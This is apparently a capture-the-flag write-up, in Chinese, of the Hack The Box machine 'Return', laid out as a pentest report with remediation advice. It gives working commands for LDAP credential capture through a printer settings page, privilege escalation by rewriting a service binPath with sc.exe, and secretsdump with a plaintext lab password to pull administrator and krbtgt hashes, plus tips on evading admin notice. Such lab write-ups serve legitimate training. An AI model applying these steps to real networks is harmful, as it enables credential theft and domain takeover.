## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Return
2. 難度:Easy
3. IP:10.129.95.241

### 主要發現：
1. 漏洞 ：不安全的LDAP設置頁面導致憑證攔截（風險等級：High）
2. 漏洞 ：Server Operators組特權濫用導致權限提升（風險等級：High）

### 攻擊鏈摘要：

系統管理頁面允許使用者自定義LDAP伺服器IP，且未對請求進行嚴格驗證。攻擊者可將其導向惡意伺服器，從而攔截明文的登入憑證。攻擊者獲得屬於Server Operators組的帳號，由於該組成員具備管理系統服務的權限，攻擊者可透過修改服務執行路徑（BinPath）來執行任意代碼，進而將自己提升至Administrators組。

### 潛在影響：

1. 不安全的LDAP設置頁面將導致憑證攔截，造成網域控制權外洩、重要資料被竊取。
2. 高權限管理帳號未被分層控管，易造成權限提升，導致管理員權限外洩、網域權限崩潰。
3. 攻擊者可能建立後門帳號或修改組策略以維持長期存取權。

### 修復建議：

1. 針對Web管理頁面的LDAP設定增加嚴格的IP或域名白名單限制，防止請求被重新導向至未知主機。
2. 檢視並縮減Server Operato組的成員，建議使用專用的管理工作站與分層管理模型，避免高權限帳號在低安全性伺服器上登入。
3. 限制非管理員帳號修改系統服務配置的權限，並針對服務路徑變更行為建立監控告警。
4. 強制要求LDAP通訊必須使用加密的LDAPS，防止憑證在傳輸過程中被輕易截獲。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠，有開啟80/http，優先度非常高

```bash
sudo nmap -sT -Pn --min-rate 1000 -p- 10.129.95.241 -oA portscan/ports
sudo nmap -sU -Pn --top-ports 20 10.129.95.241 -oA portscan/udp
sudo nmap -sT -Pn -sV -sC -O -p$ports 10.129.95.241  -oA portscan/detail
```

<img width="799" height="754" alt="螢幕擷取畫面 2026-04-12 173625" src="https://github.com/user-attachments/assets/9f74ac92-26ef-4bf8-a3fc-3290ef020298" />

<img width="619" height="565" alt="螢幕擷取畫面 2026-04-12 173636" src="https://github.com/user-attachments/assets/470c03a4-e610-4087-8bdd-4d3ab0240c48" />

<img width="1793" height="804" alt="螢幕擷取畫面 2026-04-12 174008" src="https://github.com/user-attachments/assets/bec63ea5-0464-48c9-b2c7-a71776f39014" />

<img width="1912" height="334" alt="螢幕擷取畫面 2026-04-12 174020" src="https://github.com/user-attachments/assets/2f4605ad-1775-45b2-8ca4-c868ad720c07" />


使用文書處理工具整理開放埠

```bash
ports=$(grep open portscan/ports.nmap | awk -F '/' '{print $1}' | paste -sd ',')
```

<img width="1171" height="219" alt="螢幕擷取畫面 2026-04-12 173752" src="https://github.com/user-attachments/assets/5c9f2753-a456-4293-8d75-e5b765beb748" />

因為UDP123有開放，我使用ntpdate時間同步，NTP協議比較不會被管理員監控，從這裡走比較隱蔽，還有其他的方法我整理在tips

```bash
sudo ntpdate 10.129.95.241
```

<img width="805" height="92" alt="螢幕擷取畫面 2026-04-12 174607" src="https://github.com/user-attachments/assets/5c0ab732-e1ea-4be2-af29-681095d7149a" />

將掃描到的域名寫入/etc/hosts

<img width="503" height="231" alt="螢幕擷取畫面 2026-04-12 174559" src="https://github.com/user-attachments/assets/43c40279-35b2-4134-8b9f-b8de3b13b028" />

### 2.2 枚舉(Enumeration)

使用smbclient匿名枚舉SMB協議，這個工具模擬現實使用者連線，比較不會因為異常連線引起管理員關注

```bash
smbclient -L //10.129.95.241 -N
```

<img width="836" height="458" alt="螢幕擷取畫面 2026-04-12 175557" src="https://github.com/user-attachments/assets/2d2f8a4e-a14b-47f5-88ba-c3812fde0660" />

同樣理由，我選擇rpcclient枚舉RPC協議

```bash
rpcclient -U "" 10.129.95.241 -N
```

<img width="641" height="295" alt="螢幕擷取畫面 2026-04-12 180350" src="https://github.com/user-attachments/assets/545f5ad7-0b84-43ed-8c6e-7a4ab502819f" />

因為我能透過rpcclient查出Domain SID，我嘗試利用impacket-lookupsid，看可否調出使用者的SID，通常，rpcclient所需的權限相對較高，rpcclient沒有權限的話一定要試用一下impacket-lookupsid

原則上，查SID是SMB/IPC$可讀的情況下才能調，所以我預期這裡是調不出來的，但依然要嘗試一下

```bash
impacket-lookupsid ""@10.129.95.241 -no-pass
impacket-lookupsid guest@10.129.95.241 -no-pass
```

<img width="1543" height="313" alt="螢幕擷取畫面 2026-04-12 180716" src="https://github.com/user-attachments/assets/e69e3b18-c437-4fbb-99e8-2fa2ee87359d" />

我檢查了HTTP

<img width="1359" height="739" alt="螢幕擷取畫面 2026-04-12 180735" src="https://github.com/user-attachments/assets/b40e66d8-ab29-4e4f-9d8f-136dada2347a" />

<img width="1252" height="555" alt="螢幕擷取畫面 2026-04-12 180748" src="https://github.com/user-attachments/assets/dff5fdc1-a0e5-4a90-abdc-a1920d0e15de" />

透過curl檢查標頭
```bash
curl -I http://return.local
```

<img width="376" height="171" alt="螢幕擷取畫面 2026-04-12 181140" src="https://github.com/user-attachments/assets/d586479c-7d82-4a21-bcda-1ca2f9070180" />

使用Gobuster爆破目錄，因為我知道這個網站是PHP寫的，我使用-x增加查找範圍

```bash
sudo gobuster dir -u http://return.local -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

<img width="920" height="549" alt="螢幕擷取畫面 2026-04-12 181320" src="https://github.com/user-attachments/assets/cf1f116c-5efb-4bed-8f23-986d69da5528" />

我檢查了setting.php的功能，透過POST請求，我了解到只有IP這個欄位允許更改

<img width="690" height="353" alt="螢幕擷取畫面 2026-04-12 181502" src="https://github.com/user-attachments/assets/b7aa1794-0676-41f5-8f98-f6e70e6086f3" />

<img width="650" height="307" alt="螢幕擷取畫面 2026-04-12 181515" src="https://github.com/user-attachments/assets/0819ffe4-d463-47d8-89ce-1613181bd7b3" />


### 2.3 初始存取(Initial Access)

我使用nc跟tcpdump準備抓包

389是LDAP的預設埠，LDAP是一種用於在IP網路中存取與管理「目錄服務」資料的開放標準網路協定，它最常用於企業內部的集中式身份驗證與帳號管理，現在我懷疑這是一個LDAP的綁定請求

```bash
nc -lvnp 389
sudo tcpdump -i tun0 port 389 -l -A
```

<img width="301" height="137" alt="螢幕擷取畫面 2026-04-12 181623" src="https://github.com/user-attachments/assets/1388e9f5-f0c6-46cd-8f07-383aaec725c9" />

將IP改為攻擊機的IP

<img width="956" height="445" alt="螢幕擷取畫面 2026-04-12 181649" src="https://github.com/user-attachments/assets/269a004f-450e-487b-99dc-11bcb29aa627" />

nc跟tcpdump都抓到明文密碼

<img width="618" height="235" alt="螢幕擷取畫面 2026-04-12 181657" src="https://github.com/user-attachments/assets/8b0db523-0496-44b8-a0ad-c7b903ee47bd" />

<img width="1590" height="580" alt="螢幕擷取畫面 2026-04-12 182553" src="https://github.com/user-attachments/assets/667e75f2-723c-4d96-8a55-b654a316f6c2" />

將憑證存成文件

<img width="264" height="134" alt="螢幕擷取畫面 2026-04-12 182708" src="https://github.com/user-attachments/assets/578a0ed2-d4e3-494f-b81e-71eada67f857" />

嘗試使用evil-winrm連線

<img width="1190" height="287" alt="螢幕擷取畫面 2026-04-12 182818" src="https://github.com/user-attachments/assets/081b2f63-b834-41b4-9938-9ed26a6b34da" />

獲得user.txt

<img width="605" height="294" alt="螢幕擷取畫面 2026-04-12 182900" src="https://github.com/user-attachments/assets/b12beb6f-75a6-4e54-800d-8d84d75cbe7f" />

### 2.4 權限提升(Privilege Escalation)

我檢查了當前使用者的權限和屬組，顯然這個使用者能做的事很多

<img width="1149" height="689" alt="螢幕擷取畫面 2026-04-12 183049" src="https://github.com/user-attachments/assets/cf179333-2018-483e-ac97-057b1212206a" />

1. SeBackupPrivilege & SeRestorePrivilege ：對系統上任何檔案的完全讀寫權限，即使是受ACL保護的檔案也一樣。
2. SeLoadDriverPrivilege：允許載入核心驅動程式，可以載入一個有漏洞的驅動程式來執行核心層級的代碼。
3. SeMachineAccountPrivilege：允許在域中創建最多10個機器帳號，可以創建一個與域控名稱相似的機器帳號，利用Kerberos票據請求漏洞獲取域管理員權限的票據。
4. Server Operators組：擁有啟動和停止大部分服務的權限，且通常對某些服務具有修改權限。

我首先嘗試了SeBackupPrivilege & SeRestorePrivilege的提權方法，導出ntds.dit再用secretsdump提取數據，但我失敗了，下載ntds.dit需要太久的時間，且我的連線狀況不太好，直接導出失敗，所以我下面演示利用Server Operators組，其他方法我會另外找時間嘗試，並且更新上來

使用Server Operators組是步驟最少且不需要任何上傳下載的方法，只要將提權邏輯寫進某個服務，再重啟服務就行，重啟時會以SYSTEM權限重啟，所以提權邏輯可以成立

我用services指令檢查啟動中的服務

<img width="1343" height="312" alt="螢幕擷取畫面 2026-04-12 191312" src="https://github.com/user-attachments/assets/e3b2e272-c265-41a4-9550-68cd38527ee3" />

我將提權邏輯"把當前用戶加入管理員組"寫入VMTools服務

```powershell
sc.exe config VMTools binPath= "net localgroup Administrators svc-printer /add"
```

<img width="1159" height="51" alt="螢幕擷取畫面 2026-04-12 191440" src="https://github.com/user-attachments/assets/2a091db8-823a-4d66-9617-3f5823e226cd" />

接著我關閉服務後重新啟動，啟動會報錯，因為net不是一個真正的服務程序，但命令通常在此時已經執行完畢，所以沒關係

```powershell
sc.exe stop VMTools
sc.exe start VMTools
```

<img width="756" height="261" alt="螢幕擷取畫面 2026-04-12 191453" src="https://github.com/user-attachments/assets/5770b4ea-0cec-446a-abc1-d39748a16156" />

重新使用evil-winrm連線

<img width="1184" height="283" alt="螢幕擷取畫面 2026-04-12 191936" src="https://github.com/user-attachments/assets/bdc0864a-9323-4f54-9bf1-a02643e1f086" />

已經成功加入管理員組了

<img width="1261" height="361" alt="螢幕擷取畫面 2026-04-12 191955" src="https://github.com/user-attachments/assets/81ee6d5a-41cd-41c0-add2-84a2c4081f15" />

這時其實已經可以讀取root.txt，但我依然希望能獲得Administrator的Shell

<img width="608" height="307" alt="螢幕擷取畫面 2026-04-12 192006" src="https://github.com/user-attachments/assets/50957894-0e0a-4a06-b636-2bfd2eb1324b" />

所以我使用impacket-secretdump導出管理員哈希

```bash
impacket-secretdump -dc-ip 10.129.95.241 'return.local/svc-printer:1edFg43012!!@10.129.95.241'
```

<img width="974" height="480" alt="螢幕擷取畫面 2026-04-12 192829" src="https://github.com/user-attachments/assets/f3ad17f5-04b4-4f7b-a39a-77e7c9f155c0" />

成功導出管理員和krbtgt哈希，krbtgt可以用來製作金票

<img width="860" height="93" alt="螢幕擷取畫面 2026-04-12 192847" src="https://github.com/user-attachments/assets/549a7818-d72d-450e-a94c-634824c5ea38" />


### 2.5 最終成果(Impact)

成功以Administrator身分獲得root.txt

<img width="643" height="406" alt="螢幕擷取畫面 2026-04-12 192956" src="https://github.com/user-attachments/assets/5d12ad24-e6e5-4a64-84a1-9aa8d9a959ba" />

---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 整體攻擊鏈清晰簡單，若熟悉相關機制，十分鐘即可打完。
2. 提權方面依舊堅持不落地原則，以命令注入為主。

### 浪費時間的部分：

1. 提權時先選擇較難的路，未審視自己的設備效能，況且以隱蔽性來看，需要下載的路優先度肯定不如命令注入。

### 新知識點：

1. 關於LDAP請求，閱讀了相關的文章。

### 與實戰對應：

1. 在許多Web管理介面(印表機設定、VPN登入、或自研ERP)常有LDAP認證設定。
2. Server Operators是AD中的內建高權限組，根據微軟官方定義，該組成員預設具有修改系統服務、啟動/停止服務以及備份/還原檔案的權限。

